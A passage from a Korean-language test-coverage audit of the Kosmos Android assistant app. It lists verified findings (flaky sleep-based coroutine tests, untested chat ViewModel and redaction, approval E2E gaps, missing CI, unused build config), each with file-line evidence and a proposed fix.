- 검증: 직접 확인: ExportImportManager.kt 의 createExportZip(체크포인트 → manifest + DB 압축), restoreFromZip(해제 → manifest 판 → 스키마 버전 범위 → 교체), extractZipSafely(경로 탈출·항목 수·총량 상한)를 읽었다. app/src/test·domain/src/test 에서 ExportImportManager·createExportZip·restoreFromZip·extractZipSafely 참조는 0건(grep 에 걸린 AuditHashChainTest 는 무관한 낱말 일치로 보임). ExportImportSafetyTest.kt:29-86 은 isRestorableVersion·replaceDatabaseFiles(가짜 바이트)·readBytesUpTo 만 본다. 따라서 경로 탈출 거부, manifest 없음·판 불일치, 더 새 버전 거부, 크기 상한 분기는 자동으로 한 번도 실행되지 않는다. 휴대폰에서 왕복은 한 번 손으로 확인됐으므로 '한 번도 확인된 적 없다'까지는 아니고 '회귀를 막는 자동 검사가 없다'가 정확하다. 제안 구현 시 유의: 운영 코드가 싱글턴 DB 를 닫지 않은 채 파일을 교체하므로(재시작 전제), 테스트에서 복원 뒤 행 확인은 DB 를 닫고 새로 열어야 한다.
- 앞선 기록: CHANGELOG 0.40.2 M2-4(하한 버전 검사·원자적 교체, 조각 함수 테스트). docs/checklists/device_gate.md:367 — 0.42.2 에서 휴대폰으로 '백업 → 할 일 추가 → 복원 → 숫자 원복'을 손으로 확인한 기록이 있다(자동 테스트는 아님).

### tests-4 · 백그라운드 구성요소 테스트가 실제 시간 대기(sleep·delay 200ms)에 기대고 있어 병렬 게이트 부하에서 가끔 깨진다 — 기록된 간헐 실패의 공통 원인
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 회차 게이트가 '전부 녹색이어야 커밋'인데, 무관한 테스트가 가끔 빨개지면 (a) 다시 돌리는 데 몇 분씩 쓰고 (b) 0.38.3 처럼 확인 전에 커밋하는 사고가 나고 (c) 진짜 실패를 '또 그거겠지'로 넘기게 된다. 지금까지는 깨질 때마다 그 테스트만 고쳤고(대기 늘리기·timeout 추가), 같은 구조의 나머지는 그대로다. 변경 기록에 '미조치'로 남은 것도 있다(EpisodeBoundaryManagerTest 2초 대기, WorkManager 잔여 작업).
- 제안: 구조를 한 번 고친다. ① 다섯 구성요소 생성자에 기본값 있는 인자 `dispatcher: CoroutineDispatcher = Dispatchers.Default`(또는 scope) 추가 — Hilt 주입에는 영향 없음(기본값). ② 테스트는 StandardTestDispatcher + runTest 로 바꿔 delay(200) 을 advanceUntilIdle()/advanceTimeBy 로 대체 — 가상 시간이라 부하와 무관하고 수 초가 수 밀리초가 된다. ③ 당장은 작은 것부터: waitUntil 세 곳을 시간 초과 시 fail() 하도록(단언 내용은 불변 — 실패 메시지만 정확해짐), 테스트 @After 에서 scope 취소용 internal 함수 호출. 단언 자체는 바뀌지 않지만 기존 테스트 본문을 손대므로 AGENTS §2-② 예외 절차대로 대상 목록을 먼저 보이고 진행.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:75 — scope = CoroutineScope(SupervisorJob() + Dispatchers.Default) 가 생성자 안에 고정(주입 불가). EpisodeBoundaryManager.kt:63, MemoryCleanupRunner.kt:91, ConversationPrewarmer.kt:48-49, StartupCoordinator.kt:61-62 도 같은 모양
  - app/src/test/java/com/kosmos/app/assistant/episode/EpisodeSummarizeSchedulerTest.kt:149-152, 190, 210, 246, 260-283 등 — 'emit 뒤 수집자가 자리 잡기를 기다리는' delay(200)·'일어나지 않음'을 확인하는 delay(300~500) 이 20여 곳
  - app/src/test/java/com/kosmos/app/assistant/episode/EpisodeSummarizeSchedulerTest.kt:105-108 — waitUntil 은 시간 초과 때 실패하지 않고 그냥 돌아온다(뒤 단언이 엉뚱한 메시지로 깨진다). EpisodeBoundaryManagerTest.kt:176-177, MorningBriefingGeneratorTest.kt:211-212 같은 모양
  - app/src/test/java/com/kosmos/app/assistant/orchestrator/ConversationPrewarmerTest.kt:90,126,179 — Thread.sleep 으로 순서를 맞춤
  - app/build.gradle.kts:91-94 — 테스트 JVM 4개 병렬(maxParallelForks = 4) + 화면 캡처 스위트가 같이 돈다 → 200ms 가 보장되지 않는다
  - 테스트마다 새로 만든 스케줄러의 scope 는 취소되지 않아(취소 수단 없음) 끝난 테스트의 코루틴이 다음 테스트로 넘어간다
- 검증: 직접 확인: EpisodeSummarizeScheduler.kt:75, EpisodeBoundaryManager.kt:63, MemoryCleanupRunner.kt:91, ConversationPrewarmer.kt:48-50, StartupCoordinator.kt:61-63 모두 생성자 안에서 CoroutineScope(SupervisorJob() + Dispatchers.Default …)를 고정으로 만든다. 세 파일에서 scope 취소 함수는 찾지 못했다. EpisodeSummarizeSchedulerTest.kt 는 runBlocking 기반이고 delay( 가 24곳, waitUntil(:105-108)은 시간 초과 때 실패 없이 돌아온다 — EpisodeBoundaryManagerTest.kt:175-178, MorningBriefingGeneratorTest.kt:210-213 도 같은 모양. ConversationPrewarmerTest.kt:90,126,179 Thread.sleep. app/build.gradle.kts:91-94 maxParallelForks=4. CHANGELOG 에 같은 계열 간헐 실패가 네 번 기록돼 있고 한 건은 '미조치'로 남아 있어 주장과 맞는다. 보정: '공통 원인'이라는 표현은 과하다 — 기록된 네 건의 원인은 제각각이고(시각 측정 위치, finally 대기, 목록 동시 수정, Main 디스패처 간섭) 실제 시간 대기는 그중 일부의 바탕일 뿐이다. 기존 테스트 본문을 손대는 일이므로 AGENTS §2-② 예외 절차(대상 목록 먼저 제시)가 필요하다는 후보의 단서가 맞다. 가장 싸고 안전한 첫 걸음은 waitUntil 세 곳을 시간 초과 시 실패하게 하는 것.
- 앞선 기록: CHANGELOG 412행(0.41.5 ConversationPrewarmerTest 전체 게이트 2/2 실패 → 그 테스트만 수정), 492-493행(MemoryCleanupRunnerTest 수정 + '기존 간헐 문제 미조치: WM.task-*, EpisodeBoundaryManagerTest 2초 대기도 부하에서 가끔 넘친다'), 740행(EpisodeSummarizeSchedulerTest 간헐 실패·확인 전 커밋), 758행(DataResetViewModelTest 원인 미확정).

### tests-5 · 토큰 예산 불변식의 '실측 오버헤드'가 손으로 적는 숫자라, 프롬프트 글이 바뀌어도 다시 재지 않으면 어떤 테스트도 빨개지지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 여유가 20토큰이라 문장 하나(0.42.9 의 18토큰 줄)가 예산을 넘길 수 있는데, '모델 입력을 바꾸면 실측이 선행'이라는 규칙은 지금 사람(과 에이전트)의 기억으로만 지켜진다. 시스템 지시·툴 설명·턴 리마인더 중 하나를 고치고 숫자를 안 고치면 불변식 테스트는 옛 숫자로 계속 녹색이고, 넘친 만큼은 휴대폰에서 '기록이 조용히 덜 들어가는' 품질 저하로만 나타난다 — 이 테스트 파일 머리말이 '그 형태로는 원인을 찾기가 매우 어렵다'고 적은 바로 그 유형이다.
- 제안: 값싼 인계철선을 하나 단다(모델 입력 불변, 테스트만). PromptFixtureExportTest 가 이미 조립하는 한국어·영어 시스템 지시 + 턴 리마인더 + (리플렉션으로 읽은) 툴 설명 문자열을 이어 SHA-256 을 내고, MEASURED_OVERHEAD 옆에 `MEASURED_PROMPT_HASH` 로 고정한다. 글이 한 글자라도 바뀌면 '프롬프트가 바뀌었다 — 실험실에서 오버헤드를 다시 재고 MEASURED_OVERHEAD 와 이 해시를 함께 갱신하라(AGENTS §2-⑤)'는 메시지로 실패한다. 날짜 블록은 이미 FIXED_TODAY/FIXED_NOW 로 고정돼 있어 결정적이다. 문서 검색 켜짐 픽스처도 같은 방식으로 하나 더.
- 근거:
  - app/src/test/java/com/kosmos/app/core/TokenBudgetInvariantTest.kt:245 — const val MEASURED_OVERHEAD = 1280, :253 MEASURED_OVERHEAD_EN = 1243, :228 MEASURED_DOC_SEARCH_OVERHEAD = 202 (모두 실험실에서 잰 값을 사람이 옮겨 적음)
  - app/src/test/java/com/kosmos/app/core/TokenBudgetInvariantTest.kt:79-86 — 불변식은 '예약(1400) ≥ 적어 둔 실측 + 프로필 상한(100)' 만 본다 → 현재 여유 20
  - core/src/main/java/com/kosmos/app/core/common/Constants.kt:77,193 — PREFILL_OVERHEAD_TOKENS = 1400, PROFILE_MAX_TOKENS = 100
  - app/src/test/java/com/kosmos/app/assistant/context/PromptFixtureExportTest.kt:66-71 — 시스템 지시에 대해 '날짜 블록이 있다·툴 이름이 있다' 같은 포함 여부만 단언. 글 전체가 바뀌었는지 고정하는 단언(길이·해시)은 app/src/test 어디에도 없다(grep 확인)
- 검증: 직접 확인: TokenBudgetInvariantTest.kt:245 MEASURED_OVERHEAD=1280, :253 MEASURED_OVERHEAD_EN=1243, :228 MEASURED_DOC_SEARCH_OVERHEAD=202 는 실험실 값을 손으로 옮긴 상수이고, :75-81 불변식은 '예약 ≥ 적어 둔 실측 + 프로필 상한'만 본다. Constants.kt:77 예약 1400, :193 프로필 상한 100 → 여유 20. PromptFixtureExportTest.kt:66-84 의 '표류 감시'는 날짜 블록·제목·툴 이름 포함 여부뿐이고, 이 파일과 app/src/test 에 글 전체를 고정하는 해시·길이 단언은 없다(MessageDigest·SHA-256 검색 0건). 즉 프롬프트 글이 바뀌어도 숫자를 안 고치면 어느 테스트도 빨개지지 않는다는 주장이 맞다. 지금까지는 규칙이 사람 손으로 지켜져 왔으므로 '현재 틀린 값'의 증거는 없다 — 인계철선이 없는 빈틈이다. 제안 검토: 날짜가 FIXED_TODAY/FIXED_NOW 로 고정돼 해시는 결정적일 것으로 보이나, 툴 설명을 리플렉션으로 읽으려면 @Tool/@ToolParam 주석이 런타임까지 남는지 확인이 필요하다(확인 안 함). 줄바꿈 문자가 운영체제마다 달라지지 않게 정규화도 해야 한다. 모델 입력은 건드리지 않는다.
- 앞선 기록: AGENTS §2-⑤(모델 입력을 바꾸면 실측 선행·MEASURED_OVERHEAD 갱신 — 수동 규칙). CHANGELOG 0.42.9(문장 한 줄을 실측한 뒤 접음 — 규칙이 실제로 지켜진 사례). 자동 감지 장치에 대한 기록은 없음.

### tests-6 · 채팅 화면의 중심인 ChatViewModel(750줄)에 직접 테스트가 없고, 빠른 반복(-Pfast)에서는 한 줄도 실행되지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 매일 쓰는 화면의 상태 기계(전송 중 중복 전송 막기, 멈춤 뒤 상태 복구, 오류 말풍선, 승인 대기 중 화면 가림 처리)가 '행복한 경로' 네댓 개의 통합 테스트로만, 그것도 실제 시간 폴링(최대 3~5초 대기)으로 확인된다. 개발 중 주로 쓰는 -Pfast 에서는 이 클래스를 고쳐도 아무 테스트도 돌지 않아, 회귀가 전체 게이트(몇 분)나 휴대폰에서야 드러난다. 면접에서 '화면 로직 테스트는?'에 답할 파일이 없다는 것도 약점이다.
- 제안: ChatViewModelTest 를 Robolectric 없이(또는 최소로) 추가한다 — 통합 테스트들이 이미 쓰는 수동 생성 방식(ToolApprovalE2ETest.kt:161-186)을 그대로 쓰되 의존성은 mockk/가짜로, Dispatchers.setMain(StandardTestDispatcher) + runTest. 우선순위 다섯 가지: ① 응답 중 sendMessage 재호출이 무시되는지 ② cancelGeneration 뒤 isInFlight 가 풀리고 modelRunner.cancel 이 불리는지 ③ sendChatMessageUseCase 가 Failure 일 때 오류 상태·말풍선 ④ 검색 실패 결과의 안내 플래그 ⑤ historyIndexOf 경계. Context 가 필요한 부분(extractImageBytes)만 Robolectric 로 남긴다. 이 파일은 -Pfast 에 포함된다.
- 근거:
  - grep 결과: ChatViewModel 을 참조하는 테스트는 ScreenCatalogTest, ChatSpeechIntegrationTest, MultimodalChatE2ETest, ToolApprovalE2ETest, VoiceChatIntegrationTest, VoiceLaunchHandlerTest(주석 수준) 뿐 — ChatViewModelTest 없음
  - app/build.gradle.kts:76-84 — -Pfast 가 위 다섯(…E2ETest, VoiceChatIntegrationTest, ChatSpeechIntegrationTest, ScreenCatalogTest)을 전부 뺀다
  - 통합 테스트가 부르는 함수는 sendMessage·toggleRecording·toggleSpeak·approvePendingRequest·rejectPendingRequest 다섯 개뿐. app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:552 cancelGeneration(멈춤), :354 retryEngine, :589-636 handleAgentResult(오류·검색 실패 분기), :179 historyIndexOf(원문 이동), :259 resolveSuggestions, :346 attachDocumentFile 실패 경로, :585 onApprovalObstructionCleared 는 어떤 테스트도 부르지 않는다
- 검증: 직접 확인: ChatViewModel.kt 는 750줄. 이를 참조하는 테스트는 ScreenCatalogTest·ChatSpeechIntegrationTest·MultimodalChatE2ETest·ToolApprovalE2ETest·VoiceChatIntegrationTest·VoiceLaunchHandlerTest 여섯뿐이고 ChatViewModelTest 는 없다. app/src/test 전체에서 cancelGeneration·retryEngine·historyIndexOf·resolveSuggestions·onApprovalObstructionCleared·attachDocumentFile 호출은 0건. app/build.gradle.kts:78-88 의 -Pfast 는 *E2ETest·VoiceChatIntegrationTest·ChatSpeechIntegrationTest·ScreenCatalogTest(그리고 BaseAgentStreamTest)를 뺀다 → 빠른 반복에서 ChatViewModel 을 실행하는 테스트는 사실상 없다(VoiceLaunchHandlerTest 가 실제로 ViewModel 을 만드는지는 열어 보지 않았다 — 후보는 주석 수준이라 함). 보정: '한 줄도 실행되지 않는다'는 -Pfast 에 한한 말이고, 전체 게이트에서는 통합 테스트 다섯이 전송·승인·거절·녹음·읽어 주기 경로를 태운다. handleAgentResult 의 오류 분기가 간접으로도 안 타는지는 확인하지 않았다. 구현 비용은 생성자 의존성이 많아 작지 않다(통합 테스트의 수동 생성부 참고).
- 앞선 기록: CHANGELOG 0.40.3 M4(-Pfast 분리), 0.27.x(ChatScreenE2ETest 삭제) — 후보 인용. ChatViewModel 단위 테스트를 두지 않기로 한 결정 기록은 찾지 못함.

### tests-7 · 승인 흐름 종단 테스트가 화면을 누르지 않고, 승인 뒤 일정이 실제로 저장됐는지도 보지 않는다 — 실행기가 실패해도 통과한다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: '쓰기는 승인 뒤에만'은 이 앱의 핵심 약속이고 README 에서 내세울 지점이다. 에이전트 단위(BaseAgentStreamTest)는 거절 시 실행기가 안 불리는 것을 잡지만, Hilt 로 전부 엮은 이 테스트는 이름(E2E)과 달리 ① 승인 시트가 화면에 뜨고 버튼이 ViewModel 에 이어져 있는지 ② 승인하면 DB 에 일정이 실제로 들어가는지를 확인하지 않는다. 예컨대 ChatScreen 이 시트를 그리지 않게 돼도, 일정 저장이 항상 실패해도 녹색이다. 0.42.7 의 '인자 키 모양' 결함처럼 테스트 입력이 실제 런타임 모양과 달라 놓친 전례와 같은 계열이다.
- 제안: 단언을 '추가'만 한다(기존 단언 불변). ① 승인 경로: 승인 시트가 뜬 뒤 화면에서 시트 제목('일정 추가 승인') 노드 존재 확인 → 승인 버튼을 performClick 으로 누르는 변형 테스트 1개 추가 ② 완료 뒤 주입받은 TaskRepository(또는 TaskDao)로 제목 '회의' 일정이 1건 있는지 ③ 거절 경로: 같은 조회가 0건인지 ④ 가짜 모델의 인자를 실제 런타임 모양(memo, 또는 snake_case start_time)으로 보내는 경우를 하나 더. 승인 버튼의 접근 문구가 테스트 계약이 되므로 AGENTS §2-② 계약 목록에 한 줄 추가.
- 근거:
  - app/src/test/java/com/kosmos/app/integration/ToolApprovalE2ETest.kt:200-206 — viewModel.sendMessage(...) 와 viewModel.approvePendingRequest() 를 직접 호출(전송 버튼·승인 시트의 버튼을 누르지 않는다). :4-7 의 hasSetTextAction·performClick·performTextInput import 는 쓰이지 않고 남아 있다
  - app/src/test/java/com/kosmos/app/integration/ToolApprovalE2ETest.kt:112-116 — 가짜 모델은 툴 결과가 오기만 하면(성공·실패 무관) '일정 처리가 완료되었습니다.' 를 답한다
  - app/src/test/java/com/kosmos/app/integration/ToolApprovalE2ETest.kt:208-212 — 승인 경로의 단언은 그 가짜 모델 문장이 화면에 있는지 하나뿐. 저장소(TaskRepository)에 일정이 생겼는지, 거절 경로(:229-239)에서 일정이 안 생겼는지는 보지 않는다
  - app/src/main/java/com/kosmos/app/assistant/tool/AddScheduleToolExecutor.kt:63-74 — 실행 실패 시에도 오류 JSON 을 돌려주므로 모델 회신 턴은 그대로 진행된다
  - 같은 파일 :134 — 가짜 모델이 인자 이름 'description' 을 보내는데 선언상 이름은 'memo'(KosmosToolDeclarations.kt:104) — 실제 런타임 모양과 다른 인자로 통과하고 있다
- 검증: 직접 확인: ToolApprovalE2ETest.kt 의 승인·거절 테스트는 viewModel.sendMessage / approvePendingRequest / rejectPendingRequest 를 직접 부르고(화면 누름 없음), hasSetTextAction·performClick·performTextInput import(:3,6,7)는 본문에서 쓰이지 않는다. 가짜 모델은 toolResponse 가 있기만 하면 '일정 처리가 완료되었습니다.'를 답하고(성공·실패 무관), 승인 경로 단언은 그 문장이 화면에 있는지 하나, 거절 경로는 '일정을 추가하지 않았어요.' 하나다. 파일 안에 TaskRepository·TaskDao 참조 0건. AddScheduleToolExecutor.kt:61-76 은 실패 때도 오류 JSON 을 돌려주므로 저장이 실패해도 이 테스트는 통과한다. 승인 시트 쪽은 ApprovalSheetContentTest 가 문구·버튼 이름을 보지만 그 파일에 performClick 이 없고, app/src/test 전체에서 승인 버튼을 누르는 테스트를 찾지 못했다 → 시트 버튼과 ViewModel 의 연결은 자동 검증이 없다. 보정: 가짜 모델의 'description' 인자는 실행기가 일부러 함께 읽는 호환 키라 '실제 모양과 달라 위험'의 근거로는 약하다(오히려 memo 키 경로가 이 테스트에서 안 탄다는 뜻). Robolectric 에서 기기 캘린더 쓰기가 성공하는지 모르므로, '일정 1건 저장' 단언을 넣으면 지금 실패할 수도 있다 — 그 경우 구현 결함인지 테스트 환경 한계인지 먼저 가려야 한다.
- 앞선 기록: AddScheduleToolExecutor.kt:95-98 주석 — 'description' 키도 읽는 것은 '테스트·과거 경로와의 호환'을 위해 일부러 둔 것. CHANGELOG 0.42.7(런타임 인자 모양 결함) — 후보 인용. 이 테스트의 단언 범위에 대한 기록은 없음.

### tests-8 · 자동 검증(CI)이 전혀 없다 — 게이트는 이 PC 에서 손으로만 돌고, 깨끗한 새 복제본에서 빌드·테스트가 되는지는 확인된 적이 없다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 1인 프로젝트라 브랜치 보호용 CI 는 필요 없다(그 결정은 그대로). 다만 다음 단계가 '포트폴리오 정리·공개'라면 ① 저장소를 본 사람이 처음 받는 신호가 '빌드 통과 표시'이고 ② '.gitignore 에 걸린 파일이나 이 PC 에만 있는 것에 테스트가 기대고 있지 않은가'는 깨끗한 환경에서 한 번 돌려 봐야만 알 수 있으며 ③ 0.38.3 의 '게이트 확인 전 커밋' 같은 사고를 푸시 시점에 한 번 더 걸러 준다. 비용은 워크플로 파일 하나다.
- 제안: 푸시 때만 도는 GitHub Actions 워크플로 1개: JDK 17 + Gradle 캐시, `./gradlew test lintDebug assembleDebug`. 화면 비교는 글꼴·렌더 차이로 운영체제에 민감하므로 둘 중 하나 — (a) windows-latest 러너에서 그대로 돌리거나 (b) ubuntu 에서 `-Proborazzi.test.verify=false` 로 화면 비교만 끄고 나머지를 돌린다((b)가 빠르고 싸다; 화면 비교는 지금처럼 로컬 게이트가 맡는다). 실패해도 푸시를 막지 않는 알림용으로 시작하고, README 에 상태 표시를 단다. 브랜치·PR 규칙은 건드리지 않는다. 릴리스 빌드는 넣지 않는다(보류 결정 유지).
- 근거:
  - 저장소 루트에 .github/ 없음, .git/hooks 에 사용자 훅 없음(sample 뿐)
  - git remote: GitHub 원격이 있다(푸시는 사용자 요청 시)
  - gradle.properties:7 — roborazzi.test.verify=true (게이트가 화면 기준 이미지 86장과 비교 — 기준 이미지는 Windows 에서 기록)
  - app/src/test/java/com/kosmos/app/assistant/context/PromptFixtureExportTest.kt:109-110 — 픽스처 폴더가 없으면 쓰지 않고 단언만 하도록 이미 'CI 나 다른 체크아웃'을 염두에 둔 코드가 있다
  - AGENTS.md §1 — '새 클론에서는 테스트를 한 번 돌려야 픽스처가 생긴다' (새 복제본 동작은 서술뿐)
- 검증: 직접 확인: 저장소 루트에 .github 폴더 없음(ls 실패). gradle.properties:8 roborazzi.test.verify=true. PromptFixtureExportTest.kt:109-110 은 픽스처 폴더가 없으면 쓰지 않고 넘어간다. CHANGELOG·plans 에서 CI·GitHub Actions 를 두지 않기로 한 결정 기록은 찾지 못했다(검색 0건). 사실 관계는 맞지만 결함이 아니라 '포트폴리오 단계에서 할 만한 일'이다 — 브랜치·PR 없음, 릴리스 빌드 보류 결정과는 충돌하지 않는다(디버그 게이트만 돌리는 제안). 확인하지 못한 것: git 훅 유무, 화면 기준 이미지가 다른 운영체제에서 어긋나는지(후보의 추정), 깨끗한 복제본에서 .gitignore 대상 픽스처 없이 테스트가 통과하는지. 워크플로를 실제 원격에 올리는 것은 공개 표면을 바꾸는 일이라 사용자 결정이 필요하고, 시점은 실사용 단계 뒤 포트폴리오 정리 때가 맞다.

### tests-9 · 빌드 스크립트에 쓰이지 않는 설정이 남아 있다 — 소스 없는 계측 테스트 의존성, :app 의 직렬화 플러그인, 빈 블록, .gitignore 누락
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 각각은 사소하지만 ① 소스 없는 androidTest 구성은 KSP(Hilt) 처리 대상을 늘리고 '계측 테스트가 있는 것처럼' 보여 포트폴리오 검토자에게 '어디 있나요?' 질문을 부른다 ② 쓰지 않는 플러그인·의존성은 '왜 있나'를 설명해야 하는 부채다(이 저장소는 libs.versions.toml 에서 같은 이유로 kotlin-android 별칭을 지운 전례가 있다) ③ .gitignore 누락은 AGENTS §1 의 'git add -A 전 확인' 부담을 늘린다.
- 제안: 한 회차의 마지막 정리 커밋으로: (a) androidTest 관련 6줄과 testInstrumentationRunner, 카탈로그의 espresso-core 제거(계측 테스트를 실제로 만들 때 되살린다) (b) :app 의 직렬화 플러그인·의존성을 빼고 컴파일 확인 — Hilt 가 만든 코드가 :data 의 타입을 풀다가 필요할 수 있으니, 실패하면 되돌리고 '[WHY] Hilt 생성 코드가 참조' 주석을 남긴다 (c) 빈 블록·주석 삭제 (d) .gitignore 를 `scratch/lab/regression/last_run*.json` 으로 넓힘. (b)는 gradle 을 돌리지 않고 본 추정이라 반드시 게이트로 확인.
- 근거:
  - app/build.gradle.kts:212-217 — androidTestImplementation 5줄 + kspAndroidTest, :22 testInstrumentationRunner — 그런데 app/src 에는 main·test 만 있고 androidTest 폴더가 없다
  - gradle/libs.versions.toml:53,160 — espresso-core 는 위 androidTest 줄에서만 쓰인다
  - app/build.gradle.kts:3 (kotlin.serialization 플러그인), :165 (kotlinx.serialization.json) — app/src/main·app/src/test 에서 'kotlinx.serialization' import·@Serializable 0건(grep). ExportManifestJsonTest 는 :data 의 ExportManifest.JSON 멤버 함수만 부른다
  - app/build.gradle.kts:159 — 내용 없는 '// CameraX' 주석, data/build.gradle.kts:25-26 — 빈 packaging { } 블록
  - git status — scratch/lab/regression/last_run_019_off.json 이 미추적으로 떠 있다. .gitignore:71 은 last_run.json 한 파일만 무시한다(last_run_*.json 변형은 git add -A 에 딸려 들어갈 수 있다)
- 검증: 맞는 부분: app/src 에는 main·test 만 있고 androidTest 폴더가 없는데 app/build.gradle.kts:209-215 에 androidTest 의존성 5줄 + :213 kspAndroidTest, :25 testInstrumentationRunner 가 있다(후보의 줄 번호는 3줄쯤 어긋남 — 212-217/22 가 아니라 209-215/25). :162 내용 없는 '// CameraX' 주석, data/build.gradle.kts:24-25 빈 packaging 블록, .gitignore:71 이 last_run.json 한 파일만 무시해 미추적 last_run_019_off.json 이 git status 에 떠 있는 것도 확인. 틀린 부분: ':app 의 직렬화 의존성은 안 쓰인다'는 성립하지 않는다. app/src 에 kotlinx.serialization import 는 0건이 맞지만, app/src/test/.../ExportManifestJsonTest.kt:18,26 이 ExportManifest.JSON.encodeToString(ExportManifest.serializer(), …)를 부른다 — Json·KSerializer 타입이 :app 테스트 컴파일 경로에 있어야 하는데 :data 는 이 라이브러리를 implementation(data/build.gradle.kts:67)으로만 선언해 밖으로 내보내지 않는다. 따라서 app/build.gradle.kts:168 의존성을 빼면 이 테스트가 컴파일되지 않을 가능성이 높다(빌드를 돌려 확인하지는 않음). 플러그인(:3)만은 :app 에 @Serializable 이 없어 뺄 수 있어 보인다. 정리: (a)(c)(d)는 그대로 유효, (b)는 '플러그인만 빼고 의존성은 유지(또는 testImplementation 으로 내림)'로 고쳐야 한다. espresso-core 가 다른 곳에서 안 쓰이는지는 카탈로그 정의(libs.versions.toml:153)만 봤다.
- 앞선 기록: libs.versions.toml 의 kotlin-android 별칭 제거 전례, CHANGELOG 0.35.1(.gitignore 처리) — 후보 인용. androidTest 구성을 남겨 두기로 한 결정 기록은 찾지 못함.

### tests-10 · 활동 기록에 넣기 전 이메일·전화번호를 가리는 함수(Redaction)에 테스트가 하나도 없다 — 한국어 문장 속 번호를 실제로 가리는지 확인된 적이 없다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: README·면접에서 '활동 기록은 민감 정보를 가려 저장한다'고 말하려면 근거가 될 테스트가 있어야 한다. 특히 한국어는 번호 뒤에 조사를 붙여 쓴다("010-1234-5678로 전화해"). 낱말 경계는 '글자/숫자와 그 밖의 것 사이'인데, 안드로이드의 정규식 엔진은 한글도 글자로 보므로 숫자 바로 뒤에 한글이 오면 경계가 아니어서 가려지지 않을 가능성이 있다(코드로 읽은 추정 — 실행해 확인하지 않았고, PC 의 자바와 안드로이드가 이 지점에서 다르게 동작할 수 있다). 500자 절단이 활동 기록의 '원문 보기'와 해시 체인 입력에 어떤 영향인지도 고정돼 있지 않다.
- 제안: Robolectric 이 아닌 순수 테스트로 시작하되(app/src/test/.../contract/ 에 :core 헬퍼 테스트들이 이미 있다 — SqlLikeEscapeTest·TagsNormalizeTest 와 같은 자리), 사례 표를 고정한다: 이메일 1, 하이픈·점·공백·붙여 쓴 번호, 번호 뒤 조사("…5678로", "…5678이야"), 앞에 한글이 붙은 경우, 16자리 카드번호처럼 가리면 안 되는 숫자, 500자 경계. 조사 사례가 실패하면 패턴의 뒤 경계를 '숫자가 아닌 것 앞'((?!\d))으로 바꾸는 수정안을 사용자에게 보이고 결정한다(활동 기록은 모델 입력이 아니다). 안드로이드와 PC 의 차이가 의심되면 같은 표를 Robolectric 러너로 한 번 더 돌린다.
- 근거:
  - core/src/main/java/com/kosmos/app/core/security/Redaction.kt:16-30 — 이메일·전화번호 패턴 치환 + 500자 절단. 전화 패턴은 양끝이 낱말 경계(\b)
  - domain/src/main/java/com/kosmos/app/domain/audit/AuditTrailService.kt:53-54, 78, 97, 145 — 모든 활동 기록(프롬프트·답·툴 결과·검색어)이 이 함수를 거쳐 저장된다
  - grep 결과: app/src/test·domain/src/test 에 Redaction·'[PHONE]'·'[EMAIL]'·'REDACTED' 0건. :core 모듈에는 테스트 소스 폴더와 테스트 의존성이 없다(core/build.gradle.kts)
- 검증: 직접 확인: core/.../Redaction.kt:17-19 이메일 패턴과 전화 패턴('\\b01[016789][-.\\s]?\\d{3,4}[-.\\s]?\\d{4}\\b'), :21-29 치환 후 500자 절단. AuditTrailService.kt:145 redact 가 Redaction.sanitize 를 부른다. app/src/test·domain/src/test·core/src 에서 Redaction·[PHONE]·[EMAIL] 참조는 제품 파일 하나뿐이고 core/src 에는 main 만 있다 → 테스트 0건이 맞다. 조사 문제('…5678로'가 안 가려질 수 있음)는 코드상 타당한 추정이다: 안드로이드의 정규식은 한글을 낱말 글자로 보므로 숫자와 한글 사이는 경계가 아니다. 보정 두 가지. ① PC 의 자바는 판에 따라 이 경계 판정이 다르다(예전 판은 한글을 글자로 보고, 최근 판은 기본이 영문·숫자 기준) — 그래서 PC 테스트가 통과해도 휴대폰에서는 안 가려질 수 있다. ② 후보가 권한 'Robolectric 러너로 한 번 더'는 도움이 안 된다 — Robolectric 도 PC 자바의 정규식을 그대로 쓴다. 휴대폰과 같은 결과를 보려면 패턴을 엔진 차이에 기대지 않게(뒤 경계를 '숫자가 아닌 것 앞'으로) 고친 뒤 표로 고정하는 편이 확실하다. 활동 기록은 기기 안에만 저장되고 화면 엿보기는 위협 모델이 아니므로 실제 피해는 작다 — README·면접에서 '민감 정보를 가린다'고 말할 근거가 약하다는 정도. 패턴 수정은 저장되는 활동 기록 내용(해시 체인 입력)을 바꾸므로 사용자 확인이 필요하다.
- 앞선 기록: CHANGELOG 1598행 — Redaction 을 AuditTrailService.redact 에 배선하고 이메일·전화번호 가림 추가(초기 기록). 테스트나 조사 붙은 번호에 대한 기록은 없음.

<details><summary>읽은 범위</summary>

읽은 것(직접 열어 확인): 루트·app·core·data·domain 의 build.gradle.kts 전부, settings.gradle.kts, gradle/libs.versions.toml, gradle.properties(미커밋 변경은 'org.gradle.tooling.parallel=true' 한 줄 — 읽기만 함), app/proguard-rules.pro, docs/testing-notes.md, .gitignore, data/schemas 목록. 테스트는 app/src/test 181개·domain/src/test 약 40개 파일의 목록·크기를 전부 보고, 다음을 본문까지 읽었다: 마이그레이션 테스트(Reminder·LibraryVector·KnowledgeEmbedding 머리말·AuditChain 의 13→14), ExportImportSafetyTest, InMemoryKosmosDbRule, EpisodeSummarizeSchedulerTest(앞 300줄), ConversationPrewarmerTest 일부, ToolApprovalE2ETest 전체, MultimodalChatE2ETest 후반, TimelineJumpTest·TopAlignScrollDeltaTest 전체, PromptFixtureExportTest 앞 120줄과 내보내기 목록, PromptAssemblerTest 목차, TokenBudgetInvariantTest 전체, KosmosToolDeclarationsTest, SearchWikipediaGroundingTest, BaseAgentStreamTest 는 테스트 이름 목록과 실행·거절 단언 위치만. 제품 코드는 대조용으로 KosmosMigrations(뒷부분)·DatabaseModule·KosmosDatabase·ExportImportManager 전체·ToolCallGuards 전체·KosmosToolDeclarations 전체·RefusalTurns/RepeatRequest/MemoSaveIntent/ScheduleTimeIntent 의 정규식·BaseAgent 일부·AddSchedule/AddReminder 실행기 